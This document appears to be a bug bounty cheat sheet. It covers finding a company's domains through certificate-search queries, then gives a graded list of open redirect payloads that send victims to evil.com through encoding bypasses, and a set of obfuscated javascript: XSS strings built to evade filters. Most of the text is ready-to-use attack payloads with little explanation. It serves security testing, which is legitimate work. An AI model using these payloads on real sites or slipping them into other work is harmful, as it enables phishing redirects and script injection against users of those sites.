# bug-bounty
Find domains 
http://crt.sh/

https://crt.sh/?O=Sony&output=json
  https://crt.sh/?q=Sony&output=json
https://crt.sh/?q=f3cd41a6035ba1b1be1670386918893734363e53


parsed.issuer.organization.raw: "Apple Inc."
https://search.censys.io/certificates


Basic Payloads:-

You can try these basic payloads to test for Open redirect vulnerability on any application

https://example.com/login?redirect=http://evil.com
https://example.com/login?redirect=javascript:alert(1);
Here evil.com is our website and if example.com redirects you to this, then its vulnerable. If this is resolved then try this payloads:-

https://example.com/login?redirect=http://example.com@evil.com
https://example.com/login?redirect=http://example.com%09.evil.com
If these are resolved, then try these:-

https://example.com/login?redirect=http://example.com%3F.evil.com
https://example.com/login?redirect=http://example.com%2523.evil.com
https://example.com/login?redirect=http://evil.com?c=.example.com
https://example.com/login?redirect=http://example.com%252Eevil.com
Other Open Redirect Payloads:-

https://example.com/login?next=//example.com@evil.com
https://example.com/login?next=/\/evil.com
https://example.com/login?next=//%2F/evil.com
https://example.com/login?next=/%0D/evil.com
https://example.com/login?next=/%5Cevil.com
https://example.com/login?next=//evil%E3%80%82com
https://example.com/login?next=%09http:///example.coc%40evil.com
Try this Intigriti open redirect payload generator tool here 


XSS Payloads for Open redirect:-

";alert(0);//
java%0d%0ascript%0d%0a:alert(0) j%0d%0aava%0d%0aas%0d%0acrip%0d%0at%0d%0a:confirm`0` java%07script:prompt`0` java%09scrip%07t:prompt`0` jjavascriptajavascriptvjavascriptajavascriptsjavascriptcjavascriptrjavascriptijavascript pjavascriptt:confirm`0`
https://www.cyberick.com/post/open-redirect-and-its-bypasses
